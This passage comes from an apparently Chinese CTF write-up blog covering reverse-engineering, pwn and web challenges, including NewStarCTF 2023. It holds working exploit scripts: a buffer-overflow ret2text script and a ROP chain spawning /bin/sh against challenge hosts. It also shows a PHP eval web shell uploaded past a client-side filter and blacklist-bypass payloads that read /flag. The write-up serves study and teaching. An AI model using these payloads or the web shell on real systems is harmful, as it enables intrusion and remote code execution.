((i >>> 16) & 255);\n        bArr[i2 + 3] = (byte) ((i >>> 24) & 255);\n    }\n\n    private static byte[] hexStringToBytes(String str) {\n        int length = str.length();\n        byte[] bArr = new byte[length / 2];\n        for (int i = 0; i < length; i += 2) {\n            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));\n            System.out.print(bArr[i / 2] + \",\"); ##这里是添加的\n        }\n        return bArr;\n    }\n\n    private static String bytesToHexString(byte[] bArr) {\n        StringBuilder sb = new StringBuilder();\n        int length = bArr.length;\n        for (int i = 0; i < length; i++) {\n            sb.append(String.format(\"%02x\", Byte.valueOf(bArr[i])));\n        }\n        return sb.toString();\n    }\n}\n```\n\n\n\n``` python\nkey = [-50, 67, 40, 58, -9, 61, 16, 104, 21, -2, 82, -109, -76, 116, -11, 48, -99, 68, 6, 60, 127, -34, 25, 83, 51, 0,\n       -58, 6, 3, -33, -27, 40, -47, -102, -18, 47, 109, -74, 21, 25, 30, 69, ]\nenc = [-88,47,73,93,-116,11,35,81,32,-53,107,-95,-125,89,-64,81,-81,115,43,8,74,-22,122,126,80,100,-91,49,46,-24,-121,31,-78,-7,-41,31,95,-122,115,45,40,56,81,26,-10,-25,105,-36,-21,59,122,-97,-89,-102,81,-116,52,-61,-106,85,-81,-54,-123,119,\n-32,32,105,-37,-117,6,-128,89,2,-4,-21,-118,-94,-81,103,26,21]\nfor i in range(len(key)):\n    tmp = key[i] ^ enc[i]\n    if tmp < 0:\n        print(chr(-tmp), end='')\n    else:\n        print(chr(tmp), end='')\n```\n\n### [WEEK3]crackme\n\n[Lua 工具箱 (luatool.cn)](https://www.luatool.cn/index.php)\n\nPE提示这是个lua代码，那么我们去在线网站直接解密一下\n\n![image-20231105141117807](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231105141117807.png)\n\n\n\n``` lua\nprint(\"please input your flag:\")\nflag = io.read()\ncode = {}\nsecret = {\n    54, 57, 566, 532, 1014, 1, 7, 508, 10, 12, 498, 494, 6, 24, 14, 20, 489, 492, 0, 10, 490, 498, 517, 539, 21, 528, 517, 530, 543, 9, 13, 0, 4, 51, 562, 518, 9, 0, 516, 6, 2, 572, 2, 515, 60, 63, 62, 570, 553, 31, 1, 594, 117, 15\n}\nl = string.len(flag)\nfor i = 1, l do\n  num = ((string.byte(flag, i) + i) % 333 + 444) % 555 - 1\n  table.insert(code, num)\nend\nfor i = 1, l do\n  x = i - 1\n  if i + 2 >= l then\n    code[i] = code[i % l + 1] ~ code[(i + 1) % l + 1]\n  else\n    code[i] = code[(i + 1) % l] ~ code[(i + 2) % l]\n  end\nend\nfor i = 1, l do\n  if secret[i] ~= code[i] then\n    print(\"Incorrect\")\n    return\n  end\nend\nprint(\"You win,flag is\", flag)\n\n```\n\nz3约束：\n\n``` python\n# z3 can't solve problems like x%100==1(these mod value equation)\nfrom z3 import *\n\ns = Solver() \t\nsecret = [54, 57, 566, 532, 1014, 1, 7, 508, 10, 12, 498, 494, 6, 24, 14, 20, 489, 492, 0, 10, 490, 498, 517, 539, 21,\n          528, 517, 530, 543, 9, 13, 0, 4, 51, 562, 518, 14, 527, 520, 0, 517, 57, 575, 512, 1, 572, 515, 60, 18, 31, 1,\n          594, 117, 15]\nl = len(secret)\nflag = [BitVec('%d' % i, 12) for i in range(l)]\ncode = flag[:]\nfor i in range(52):\n    code[i] = code[i + 1] ^ code[i + 2]\ncode[52] = code[53] ^ code[0]\ncode[53] = code[0] ^ code[1]\nfor i in range(l):\n    s.add(secret[i] == code[i])\n\n\ndef crack(a, b):\n    for x in range(1, 128):\n        if ((x + b) % 333 + 444) % 555 - 1 == a:\n            return x\n    return ord('f')\n\n\nif s.check() == sat:\n    m = s.model()\n    print(''.join([chr(crack(m[flag[i]], i + 1)) for i in range(l)]))\n```\n\n> 在这段代码中,m是Solver生成的一个模型,用于保存求解结果。\n>\n> flag是一个由BitVec组成的列表,表示未知变量。\n>\n> m[1]表示取模型m中键为1的值,但是m中没有键为整数1,所以会报错。\n>\n> m[flag[1]]表示取models中键为flag[1]的值,相当于取键为flag列表中第二个元素的值。\n>\n> flag列表在代码中初始化为:\n>\n> ```\n> python\n> \n> Copy code\n> \n> flag = [BitVec('[*]%d' % i , 12) for i in range(len)]\n> ```\n>\n> 所以flag[1]对应的是BitVec('[*]1', 12),也就是第二个未知变量。\n>\n> 模型m中确实有这个键,所以可以正确打印出键为flag[1]的值。\n>\n> 总结一下:\n>\n> m[1]: 错误访问,模型m没有整数键1\n>\n> m[flag[1]]: 正确访问,取出模型中的第二个未知变量\n>\n> 所以两者输出不同,一个报错一个可以正确打印值。\n>\n> 区别在于m[flag[1]]通过flag列表 indirect 访问了模型的一个键,而m[1]直接以整数1为键访问,该键并不存在。\n\n\n\n### 喵？喵。喵！\n\n\n\n\n\n# PWN\n\n### [WEEK1]nc\n\n直接连上cat flag\n\n\n\n### [WEEK1] 四则计算器\n\nstrlen遇到/x00，停止读取来溢出，跳过长度判断\n\n``` python\nfrom pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug')\n\n# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n# p = gdb.debug('./ret2text')\n# p = process('./ret2text')\n\np = remote('112.6.51.212',32774)\n\ndef debug():\n    gdb.attach(r)\n    pause()\n\n\nbackdoor = p64(0x4015E1)\n\npad = b'\\x00'*(0x32+8)\n\npayload = pad + backdoor\n\np.sendlineafter('>',payload)\n\np.interactive()\n```\n\n\n\n\n\n### [WEEK1]口算题\n\n交互题目，但是其中包含了两unicode字符，我们修改一下将其解码成utf-8编码就好了\n\n``` python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\n\np = remote('112.6.51.212',30687)\np.sendlineafter(b'start...', b'')\n\nfor i in range(200):\n    p.recvline()\n    a = p.recvline().decode('utf-8')\n    a = a[0:-3]\n    a = a.replace('÷', '/')\n    a = a.replace('×', '*')\n    print(a)\n    r = eval(a)\n    p.sendline(str(r))\n    p.recvline()\n\np.interactive()\n\n```\n\n### [WEEK1]猜数游戏\n\n经典猜数\n\n``` python\nfrom pwn import *\nfrom ctypes import *   \ndll = cdll.LoadLibrary('libc.so.6')\ncontext(os='linux', arch='amd64', log_level='debug')\nip, port = '112.6.51.212:32778'.split(':')\np = remote(ip ,port)\n\na = dll.srand(dll.time(0))\nb=dll.rand()\n\n# p.recvuntil(b'number?')\np.sendlineafter('number?',b'11')\np.sendline(str(b))\nprint(b)\n\np.interactive()\n\n```\n\n### [WEEK1]hard nc\n\ngift2里有个base64,解密即可\n\n> MWYtOTdlNi0wMzBiNTNlNjdkODN9Cg==\n\nls -a，可以看到隐藏的文件，然后直接\n\n> cd .gift    ##别忘了(.)\n\n### [WEEK1]ropchain\n\n题目就已知是使用ROPgadget做了，那我们能干什么，直接顺从\n\n> ROPgadget --binary 文件名 --ropchain\n\n``` python\nfrom pwn import *\nfrom struct import pack\n\ncontext.log_level = 'debug'\ncontext(arch='amd64', os='linux')\n# p=process('chal')\npl=remote('112.6.51.212',32783)\n# p=gdb.debug('./chal')\n# p=remote(\"node3.buuoj.cn\",28477)\n#p=process('./wustctf2020_name_your_cat')\n# elf=ELF('./wustctf2020_name_your_cat')\n\n# Padding goes here\np = b'a'*(0x20+8)\n\np += pack('<Q', 0x000000000040a30d) # pop rsi ; ret\np += pack('<Q', 0x000000000049d0c0) # @ .data\np += pack('<Q', 0x0000000000419a1c) # pop rax ; ret\np += b'/bin//sh'\np += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x000000000040a30d) # pop rsi ; ret\np += pack('<Q', 0x000000000049d0c8) # @ .data + 8\np += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret\np += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret\np += pack('<Q', 0x0000000000401d1d) # pop rdi ; ret\np += pack('<Q', 0x000000000049d0c0) # @ .data\np += pack('<Q', 0x000000000040a30d) # pop rsi ; ret\np += pack('<Q', 0x000000000049d0c8) # @ .data + 8\np += pack('<Q', 0x0000000000401858) # pop rdx ; ret\np += pack('<Q', 0x000000000049d0c8) # @ .data + 8\np += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret\np += pack('<Q', 0x0000000000401243) # syscall\n\npl.sendline(p)\n\npl.interactive()\n```\n\n### [WEEK1]babystack\n\n\n\n"},{"title":"newstarctf","url":"/2023/09/25/newstarctf/","content":"\n\n\n# Week1\n\n\n\n## re\n\n### ELF\n\n``` python\nstring=\"V\\QWkt $_e'^_ggXQ'u|v!c/m\"\nstring=list(string)\n\nfor i in range(len(string)):\n  string[i]=ord(string[i])-16^0x20\n  print(chr(string[i]),end='')\n```\n\n### 咳\n\n``` python\nstring=\"gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~\"\nstring=list(string)\n\nfor i in range(len(string)):\n  string[i]=ord(string[i])-1\n  print(chr(string[i]),end='')\n```\n\n\n\n### Segments\n\n\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.230oqvgvsl0g.png)\n\nflag{You_ar3_g0od_at_f1nding_ELF_segments_name}\n\n\n\n### AndroXor\n\n\n\n``` python\nkey = [14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '>', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r']\nascii_values = []\n\nfor item in key:\n    if isinstance(item, int):\n        ascii_values.append(item)\n    else:\n        ascii_values.append(ord(item))\n\nstring2 = \"happyx3\"\nstring2 = list(string2)\nresult = []\n\nfor i in range(len(ascii_values)):\n    char_code = ascii_values[i] ^ ord(string2[i % len(string2)])\n    result.append(chr(char_code))\n\nprint(''.join(result))\n```\n\n### EzPE\n\n\n\n``` python\ndata = [\n  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C, \n  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51, \n  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04, \n  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D\n]\n\nresult = \"\"\n\nfor i in range(len(data) - 2, -1, -1):\n    data[i] = data[i] ^ i ^ data[i+1]\n    result += chr(data[i])\n\nfor j in range(len(result)-1,-1,-1):\n   print(result[j],end='')\n```\n\n\n\n## web\n\n### 泄漏的秘密\n\n``` python\nimport requests\n\nurl = \"http://9d41a563-79e3-4f30-a3d4-61e6e3246ede.node4.buuoj.cn:81\"\n\nli1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\nli2 = ['tar', 'tar.gz', 'zip', 'rar']\nfor i in li1:\n    for j in li2:\n        url_final = url + \"/\" + i + \".\" + j\n        r = requests.get(url_final)\n        print(r)\n```\n\n通过脚本，扫描网站可以泄露的东西，最后发现是www.zip，直接在网站最后加上，就可以下载一个www.zip，里面就包含了flag\n\n\n\n### EasyLogin\n\n抓包\n\n### ErrorFlask\n\n- **考点**：Flask报错界面信息泄露\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4llww5xoavc0.webp)\n\n提示输入number1和number2，我们随便给其中一个传入数组就会发现\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4z413itworc0.webp)\n\n成功获取flag\n\n### Begin of HTTP\n\n- **考点**：HTTP常见请求头、HTTP请求方式\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n进入题目首先要求以GET方式传参：\n\n> http://ec7fe482-428e-4978-8b2c-4016472b07a7.node4.buuoj.cn:81/index.php?ctf=ok\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6u94htzuxh00.webp)\n\n右键查看页面源代码可以看到base64编码后的secret值：\n\nbase64解码得到\n\n> n3wst4rCTF2023g00000d\n\n使用HackBar发送secret：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qq7ddqswc40.webp)\n\n接着题目要求power为ctfer，使用Burp Suite抓包修改Cookie值：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.555xj0hd2z40.webp)\n\n接着修改U-A头为NewStarCTF2023：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7a5ebded1ug0.webp)\n\n修改Referer头为newstarctf.com：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5yp1p5qib800.webp)\n\n添加X-Real-IP头，值为127.0.0.1，获得Flag：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2zgrkm49clg0.webp)\n\n### Begin of PHP\n\n- **考点**：PHP弱类型、PHP加密函数数组绕过、PHP函数特性、变量覆盖漏洞\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n题目分为五个关卡。\n\n第一关主要考察PHP中md5弱类型比较的特点，只需要找到两个值不同但md5值以0e开头的字符串即可通过本关，原理是0e在进行弱类型比较时会被当作科学计数法进行比较。\n\n``` php\nif(isset($_GET['key1']) && isset($_GET['key2'])){    echo \"=Level 1<br>\";\nif($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2']))\n{\n$flag1 = True;\n}\nelse{\n    die(\"nope,this is level 1\");\n}}\n```\n\n构造Payload如下：\n\nkey1=QNKCDZO&key2=240610708\n\n第二关主要考察PHP哈希函数的特性，在处理数组类型的传参时，md5、sha1等哈希函数会返回NULL值，由此可以构造出NULL===NULL从而通过判断。\n\n``` php\nif($flag1){\n    echo \"=Level 2=<br>\";\n    if(isset($_POST['key3']))\n    {\n       if(md5($_POST['key3']) === sha1($_POST['key3'])){\n$flag2 = True;\n       }    }\n    else{        \n        die(\"nope,this is level 2\"); \n    }}\n```\n\n\n\n> key1=QNKCDZO&key2=240610708\n\n> POST-DATA: key3[]=1\n\n\n\n第三关主要考察strcmp函数特性，如果传入的参数为数组类型，该函数就会返回NULL值，构造NULL==0从而通过判断\n\n``` php\nif($flag2){\n echo \"=Level 3=\";\n if(isset($_GET['key4'])){\n if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){\n  $flag3 = True;\n }else{\n die(\"nope,this is level 3\");}\n}\n}\n```\n\n构造Payload如下：\n\n> key1=QNKCDZO&key2=240610708&key4[]=2\n>\n> POST-DATA: key3[]=1\n\n\n\n\n\n第四关主要考察is_numeric函数特性，在传入的数字后加入任意字母即可通过本层的判断。\n\n``` php\nif($flag3){\necho \"=Level 4=\";\n if(isset($_GET['key5'])){\n if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){\n  $flag4 = True;\n}else{\ndie(\"nope,this is level 4\");\n }\n  }\n}\n```\n\n构造Payload如下：\n\n> key1=QNKCDZO&key2=240610708&key4[]=2&key5=2024a\n>\n> POST-DATA: key3[]=1\n\n第五关考察extract函数导致的变量覆盖漏洞，这里的if判断只要保证传入变量flag5即可，根据上面的正则限制，变量值不能为字母和数字，那么传入一个任意符号即可通过本层。\n\n``` php\nif($flag4){\necho \"=Level 5=\";\nextract($_POST);\nforeach($_POST as $var){\nif(preg_match(\"/[a-zA-Z0-9]/\",$var)){\ndie(\"nope,this is level 5\");\n}\n}\nif($flag5){echo file_get_contents(\"/flag\");\n}else{die(\"nope,this is level 5\");\n  }\n}\n```\n\n构造Payload如下：\n\n> key1=QNKCDZO&key2=240610708&key4[]=2&key5=2024a\n>\n> POST-DATA: key3[]=1&flag5=?\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.58yehkkyq3o0.webp)\n\n### Begin of Upload\n\n- **考点**：PHP文件上传漏洞\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n本题主要考察PHP文件上传漏洞的前端校验绕过\n\n编写含有一句话木马的文件命名为1.php内容为\n\n``` php\n<?php\n\n@eval($_POST['1']);\n\necho \"it is ok\";?>\n```\n\n点击上传文件，会弹出\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6725ejsqclg0.webp)\n\n想到题目是使用JavaScript对文件拓展名进行限制\n\n打开浏览器设置禁用js\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yqlt5zjs6k0.webp)\n\n再次上传，得到上传文件的路径\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.615ykeguv800.webp)\n\n访问路径 url/upload/1.php\n\n然后命令执行得到flag\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7efhs05aa840.webp)\n\n\n\n### R!C!E!\n\n- **考点**：md5碰撞、PHP特殊符号传参、PHP命令执行、黑名单绕过\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。\n\nsubstr($password,0,6)===\"c4d038\"\n\n可以写一个简单的 python 脚本来进行碰撞，先尝试简单的数字组合，看是否有符合条件的值\n\n``` python\nimport hashlib\ndef crack(pre):\n    for i in range(0, 999999):\n     if (hashlib.md5(str(i).encode(\"UTF-8\")).hexdigest())[0:6] == str(pre):\n      print(i)\n      break\ncrack(\"c4d038\")\n```\n\n运行结果是114514，得到了密码。\n\n再看下一个传参，可以发现这个变量名有下划线也有点。\n\n> $code=$_POST['e_v.a.l'];\n\n这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。具体转换可以参考下图：\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2019h3nte800.webp)\n\n于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e[v.a.l 。\n\n最后看命令执行部分，这里是有一个黑名单的过滤：\n\n``` php\nif(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){\neval($code);\n}\n```\n\n可以看到是禁止了 system 函数，可以采用 php 自带的函数来达到一样的效果，先使用 scandir 看一下目录，注意 scandir 是不会回显输出的，记得加上 var_dump。\n\n> e[v.a.l=var_dump(scandir('/'));\n\n看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：\n\n> POST:password=114514&e[v.a.l=var_dump(file_get_contents($_POST['a']));&a=/flag\n\n得到flag。\n\n### EasyLogin\n\n- **考点**：弱口令登录、HTTP 302 跳转抓包\n\n- **FLAG**：动态FLAG\n\n- **解题步骤**\n\n进入之后是一个登录界面，先随便注册一个账号登进去看看。\n\n`Ctrl``C`和`Ctrl``D`回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录。\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.15js7ajhu4f4.webp)\n\n发现 Hint，得知 admin 的密码为弱密码加上`newstarnewstar2023`后其中的一个。\n\n按`CtrlD`或者输入`exit`后回车回到登录界面。\n\n试一下`newstar``newstar2023`，没登进去，在网上随便搜弱密码，试一些常见的，试出来是`qwe123`，不同的靶机密码可能不一样。\n\n**提示：**题目采用的弱密码表\n\n> 123456789\n>\n> password\n>\n> newstar\n>\n> newstar2023\n>\n> 123qwe\n>\n> qwe123\n>\n> qwertyuiop\n>\n> asdfghjkl\n>\n> zxcvbnm\n>\n> admin123\n>\n> admin888\n>\n> 111111\n>\n> 000000\n\n\n\n查询历史记录只提示了使用`BurpSuite`，尝试抓包。\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1o5xgiwkpqtc.webp)\n\n使用`BurpSuite`拦截、开启代理，重新完成一次登录，发现一个`/passport`的 302 跳转，查看它的响应获取 flag.\n\n![image](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2tryl616bns0.webp)\n\n\n\n\n\n\n\n# week2\n\n## re\n\n### PZthon\n\n先使用python pyinstxtractor-ng.py PZthon.exe，将exe转换成pyc文件\n\n然后使用uncompyle6发现需要python3.9的版本，好好好，电脑里一个3.10一个3.8就是没有3.9，所以直接去网站解码就行\n\n[python反编译 - 在线工具 (tool.lu)](https://tool.lu/pyc/)\n\n``` python\nenc = [\n    115,\n    121,\n    116,\n    114,\n    110,\n    76,\n    37,\n    96,\n    88,\n    116,\n    113,\n    112,\n    36,\n    97,\n    65,\n    125,\n    103,\n    37,\n    96,\n    114,\n    125,\n    65,\n    39,\n    112,\n    70,\n    112,\n    118,\n    37,\n    123,\n    113,\n    69,\n    79,\n    82,\n    84,\n    89,\n    84,\n    77,\n    76,\n    36,\n    112,\n    99,\n    112,\n    36,\n    65,\n    39,\n    116,\n    97,\n    36,\n    102,\n    86,\n    37,\n    37,\n    36,\n    104]\n\nfor i in range(len(enc)):\n    enc[i]=enc[i]^21\n    print(chr(enc[i]),end='')\n```\n\n### SMC（*）\n\n记录一次SMC的实操\n\n首先我们分析源码\n\n``` c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  DWORD *v3; // eax\n\n  v3 = malloc(0x26u);\n  VirtualProtect(sub_403040, 0x26u, 0x40u, v3);\n  puts(\"Please enter your flag:\");\n  sub_401025(\"%s\", &byte_4033D4);\n  if ( NtCurrentPeb()->gap2 )\n  {\n    MessageBoxA(0, \"Debug Detected!\", \"Warning!\", 0);\n    Sleep(0x1388u);\n    exit(0);\n  }\n  sub_401042();\n  if ( (*sub_403040)(&byte_4033D4, &byte_403020) )\n    puts(\"Win!\");\n  else\n    puts(\"Lose!\");\n  return system(\"pause\");\n}\n```\n\nSMC是对程序进行自加密的题型，一般会有自解函数，只要你执行到SMC自解函数就可以看到本来的函数地址那块的数值变了，那个时候就可以进行编译成函数了\n\n我们可以看到自解密函数就在主函数中\n\n``` c\nchar sub_401042()\n{\n  int i; // ecx\n  char result; // al\n\n  for ( i = 0; i < 38; ++i )\n  {\n    result = byte_403068[i & 3];\n    sub_403040[i] ^= result;\n  }\n  return result;\n}\n```\n\n那么我们在result下断点，只要在程序运行到这里就可以对程序进行自解密，到目前为止这是比较一般的SMC题目的解出过程，但在我们调试的时候发现\n\n``` c\nif ( NtCurrentPeb()->gap2 )\n  {\n    MessageBoxA(0, \"Debug Detected!\", \"Warning!\", 0);\n    Sleep(0x1388u);\n    exit(0);\n  }\n```\n\n这一块函数只要检测到我们进行dbg调试就会退出程序，所以我们想到另外一种方式进行调试\n\n> Debugger->attach to process->SMC_2.exe\n\n当然我们肯定知道他自解密的函数就是  if ( (*sub_403040)(&byte_4033D4, &byte_403020) )（需要你去看一下他的自解密函数的语句），我们此时对比一下解密与不解密之前的数值\n\n没解密之前的地址数值\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5d4k5tf47eg0.webp)\n\n自解密后的数值\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.26iivmz0gklc.webp)\n\n我们可以看到明显的不同，我们没有发现花指令等，那么我直接在函数头的位置按c将其转换成代码，在按p编译成函数就可以F5啦\n\n``` c\nchar sub_403040()\n{\n  int v0; // edx\n\n  v0 = 0;\n  while ( (byte_4033D4[v0] ^ 0x11) + 5 == byte_403020[v0] )\n  {\n    if ( ++v0 >= 32 )\n      return 1;\n  }\n  return 0;\n}\n```\n\n反编译出来的代码可以看出就是很贱的加减异或，直接编写代码返还即可\n\n``` python\nchars=[\n  0x7C, 0x82, 0x75, 0x7B, 0x6F, 0x47, 0x61, 0x57, 0x53, 0x25, \n  0x47, 0x53, 0x25, 0x84, 0x6A, 0x27, 0x68, 0x27, 0x67, 0x6A, \n  0x7D, 0x84, 0x7B, 0x35, 0x35, 0x48, 0x25, 0x7B, 0x7E, 0x6A, \n  0x33, 0x71]\n\nfor i in range(len(chars)):\n    chars[i]=(chars[i]-5)^0x11\n    print(chr(chars[i]),end='')\n```\n\n\n\n### Petals（花指令）\n\n学习花指令\n\n``` c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  puts(\"Here is a pack of flowers, to my best love --- you.\");\n  puts(\"But I must check your identity, please input the right passwd\");\n  __isoc99_scanf(\"%s\", byte_4080);\n  v4 = strlen(byte_4080);\n  if ( strlen(byte_4080) != 25 )\n  {\n    puts(\"Please check your input's format!\");\n    exit(-1);\n  }\n  (loc_1209)(byte_4080, v4);\n  sub_160C(byte_4080, &unk_4020, v4);\n  printf(\"If you are succeed, the flag is flag{md5(your input)}\");\n  return 0LL;\n}\n```\n\n分析主函数，我们已知前面是接受我们的输入，然后输入的长度是25，&unk_4020中就是我们的数据，我们提取出来后备用，我们猜测(loc_1209)(byte_4080, 